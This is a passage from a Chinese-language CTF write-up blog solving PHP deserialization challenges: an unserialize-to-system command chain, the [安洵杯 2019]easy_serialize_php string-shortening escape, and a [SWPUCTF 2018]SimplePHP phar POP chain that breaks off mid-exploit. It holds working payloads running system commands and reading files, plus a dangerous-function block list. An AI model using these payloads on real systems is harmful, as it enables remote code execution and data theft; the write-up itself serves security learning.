<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents() 函数是用于将文件的内容读入到一个字符串中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);//获取变量类型</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.接下来不看wp，自己分析了一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会判断$func内的内容是否为空，并且其中的内容在$disable_fun中有没有，如果都通过就执行<code>echo gettime($func, $p);</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);//获取变量类型</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>call_user_func()函数会把第一个参数当多回调函数，第二个参数当作回调函数的参数，如果$func是unserialize，那么就会将$p的内容进行反序列化，就会自动调用__destruct()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的__destruct()方法会再次调用gettime函数，这时候如果$func是system，$p是cat &#x2F;flag不就可以得到flag了吗</p>
<p>4.思路为先利用$func来第一次调用gettime函数，利用call_user_func()函数来使__destruct()方法进行调用，然后再进行第二次调用gettime函数，给$p传参为序列化的Test类中$func为system，$p为cat &#x2F;flag，进行反序列化后就会给$func和$p赋值然后就会执行call_user_func()函数</p>
<p>5.构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    var $p = &#x27;cat /flag&#x27;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">输出</span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:9:&quot;cat /flag&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在burp中进行传参func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:9:”cat &#x2F;flag”;s:4:”func”;s:6:”system”;}，但是并没有回显什么有用的信息</p>
<p>6.看wp，发现思路是对的，就是构造payload时的思路是错的，flag并没有在&#x2F;flag文件中，我们先需要进行寻找带有flag的文件</p>
<p>再次构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    var $p = &#x27;find / -name flag*&#x27;;//-name flag*是寻找以flag开头的文件</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">输出</span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在burp中进行传参func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:18:”find &#x2F; -name flag*”;s:4:”func”;s:6:”system”;}，发现可以回显许多带有flag的文件，就是回显的时候有点慢，需要等</p>
<p>7.其中有用的是&#x2F;tmp&#x2F;flagoefiu4r93</p>
<p>在burp中再次传参func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:22:”cat &#x2F;tmp&#x2F;flagoefiu4r93”;s:4:”func”;s:6:”system”;}</p>
<p>最后得到了flag</p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><p>1.点击页面上的source_code，显示出源代码</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.这里有一句话maybe you can find something in here!，意思是里面可能有东西，我们将f&#x3D;phpinfo，打开了php的版本，然后查找带有flag的字符，发现并没有什么，但这句话这里面肯定有有用的东西，可是我并没有找到什么，看wp发现里面的 d0g3_f1ag.php文件里应该有flag，之后我们的目的就是打开d0g3_f1ag.php文件</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是如果$function等于highlight_file就会打开index.php，如果$function等于phpinfo就会执行eval(‘phpinfo();’)，如果$function等于show_image就会先将$serialize_info序列化，然后file_get_contents()函数会把经过base64解码的$userinfo[‘img’]中的内容以字符串的形式返回出来</p>
<p>5.看filter()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果echo $filter会输出php|flag|php5|php4|fl1g，<code>return preg_replace($filter,&#39;&#39;,$img);</code>是将$img中含有$filter的内容替换为空</p>
<ol start="6">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>

<p>会先将$_session进行序列化以后，再进行filter方法</p>
<p>7.一开始看到<code>$_SESSION[&quot;user&quot;] = &#39;guest&#39;;  $_SESSION[&#39;function&#39;] = $function;  $_SESSION[&#39;img&#39;]</code>还不知道是什么，然后看wp知道这个user,function,img是$_SESSION中的数组的键名</p>
<p>8.这道题的思路是可以利用<code>preg_replace($filter,&#39;&#39;,$img);</code>进行缩短型的反序列化逃逸，目的是要让img这个键名的键值为我们需要打开的文件名的base64编码，先在url处将f&#x3D;show_image，然后在hackbar的post处进行传参，传入<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code></p>
<p>9.这样经过系列化和filter方法后就变成了<code>&quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>，相当于user的键值是<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>，img的键值是<code>ZDBnM19mMWFnLnBocA==</code>，dd的键值是<code>a</code>，而后面的<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>就被废除了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">这里的s:2:&quot;dd&quot;;s:1:&quot;a&quot;;中的dd和a可以随便改值，因为_session这个数组中一共有三个元素，只要凑够三个元素就可以了</span><br></pre></td></tr></table></figure>

<p>10.查看源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将payload中的ZDBnM19mMWFnLnBocA&#x3D;&#x3D;换成L2QwZzNfZmxsbGxsbGFn，这里的L2QwZzNfZmxsbGxsbGFn是&#x2F;d0g3_fllllllag的base64编码</p>
<p>最后得到flag</p>
<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>1.打开网页是显示首页，查看文件，上传文件；首页打开的文件是index.php，在查看文件那打开index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);  </span><br><span class="line">include &#x27;base.php&#x27;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>在打开base.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base.php</span><br><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>

<p>打开file.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file.php</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);  </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">    die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>打开upload_file.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload_file.php</span><br><span class="line">&lt;?php </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">upload_file(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charest=&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;文件上传&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;div align = &quot;center&quot;&gt; </span><br><span class="line">        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    p&#123; margin:0 auto&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">&lt;div&gt; </span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>打开function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">function.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>打开class.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php</span><br><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.其中有用的是class.php，里面没有反序列化函数，但可以使用phar反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar反序列化</span><br><span class="line">利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</span><br></pre></td></tr></table></figure>

<p>3.进行反序列化时会先调用<code>__wakeup()</code>方法，该方法是查看source是否含有<code>http|https|file:|gopher|dict</code>，只有不含有就相当于没用，然后会自动调用<code>__destruct()</code>方法，让str&#x3D;一个对象就会自动调用<code>__toString()</code>函数，然后再跳到<code>__get()</code>方法，就会调用file_get($value)，最后就可以打开$value的内容，在base.php文件中知道了flag在f1ag.php中，让$value等于f1ag.php就可以</p>
<p>4.构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;<span class="comment">//不知道为什么不可以直接写/f1ag.php</span></span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span 